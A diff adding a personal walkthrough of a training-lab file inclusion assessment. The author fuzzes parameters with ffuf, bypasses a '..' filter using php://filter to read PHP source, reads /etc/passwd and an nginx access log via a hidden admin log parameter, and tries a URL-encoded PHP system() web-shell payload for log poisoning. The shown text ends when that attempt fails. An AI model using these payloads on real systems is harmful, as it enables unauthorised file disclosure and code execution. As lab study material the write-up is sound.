@@ -904,4 +904,124 @@ This one I just guessed it meant security.
 
 ## Skills Assessment - File Inclusion
 
+The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.
+
+They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.
+
+Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.
+
+
+--------------
+The question in this section is:
+Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
+
+The first thing I see is when I click on another page is this:
+`http://94.237.55.12:41906/index.php?page=industries`
+
+So it could be already indicating LFI.
+
+I figured I might try one of the LFI lists to start out.
+
+`ffuf -w /Users/noneya/Useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.55.12:41906/index.php?page=FUZZ'`
+
+This returns a lot of files that return two difference size. When I try this:
+`http://94.237.55.12:41906/index.php?page=../../../../../../../../../../../../../../../../../../../../etc/passwd`
+
+I get invalid input detected.
+
+Which tells me this might be a form of whitelist or blacklist maybe.
+
+Maybe I can reveal the code for index.php
+
+That doesn't seem to be working. But when I submit a message with their contact form I see this:
+`http://94.237.55.12:41906/index.php?message=test#`
+
+Maybe I can try it here.
+
+`ffuf -w /Users/noneya/Useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.55.12:41906/index.php?message=FUZZ'`
+
+No that didn't work. But one thing that was pointed out in a recent section is that most of the time obvious parameters are not vulnerable, but I can fuzz for non public paramters. So lets try that.
+
+`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.55.12:41906/index.php?FUZZ=value'`
+
+All that returned is the page variable we already know about.
+
+So maybe I fuzz for pages instead.
+
+So quick testing shows that anytime I add .. to the page, it responds invalid input. So the first thing I need to do is figure out how to break that.
+
+Looking for other pages we see all of the php files associated with various pages. And an images directory. Based on the page source we know one image is called img_1.jpg. So lets see if we can do:
+`http://94.237.55.12:41906/index.php?page=../images/img_1.jpg`
+
+We get an invlaid input detected. Which isn't a surprise because I thought .. was blocked. But it confirms its not because the file does not exist.
+
+I also will not that they start the image name with img_. Early on in the module it mentioned:
+```
+In our previous example, we used the language parameter after the directory, so we could traverse the path to read the passwd file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:
+include("lang_" . $_GET['language']);
+```
+
+It makes me wonder if the same thing is happening here like page_contact.php. But I think thats just wrong.
+
+Okay so I find this works:
+`http://94.237.63.201:31623/index.php?page=php://filter/read=convert.base64-encode/resource=index`
+
+When I decode, I see this:
+``` php
+<?php 
+// echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
+?>
+```
+
+And I see this:
+``` php
+<?php
+if(!isset($_GET['page'])) {
+  include "main.php";
+}
+else {
+  $page = $_GET['page'];
+  if (strpos($page, "..") !== false) {
+    include "error.php";
+  }
+  else {
+    include $page . ".php";
+  }
+}
+?>
+```
+
+The admin page shows a bunch of logs...
+
+The other section seems to indicate if there is any instance of .. it will throw the error page... But maybe I can fuzz for other pages under admin and or other paramters.
+
+Actually I tried running this:
+`http://83.136.249.183:37862/index.php?page=php://filter/read=convert.base64-encode/resource=ilf_admin/index`
+
+And after decoding I see this:
+``` php
+	if(isset($_GET['log'])) {
+	  $log = "logs/" . $_GET['log'];
+	  echo "<pre>";
+	  include $log;
+	  echo "</pre>";
+	}
+	?>
+```
+
+That should be vulnerable to LFI.
+
+Yup running `http://83.136.249.183:37862/ilf_admin/index.php?log=../../../../../../../../../../etc/passwd` works.
+
+Now all we need is RCE which I think the log hint is a good one.
+
+Based on the burp response I saw it was nginx server. And I found online the access logs are found here: `var/log/nginx/access.log`
+
+So I tried:
+`http://83.136.249.183:37862/ilf_admin/index.php?log=../../../../../../../../../../../../var/log/nginx/access.log` and it worked. So now I think we have our access to RCE.
+
+Lets try:
+`%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
+
+That didn't work
 
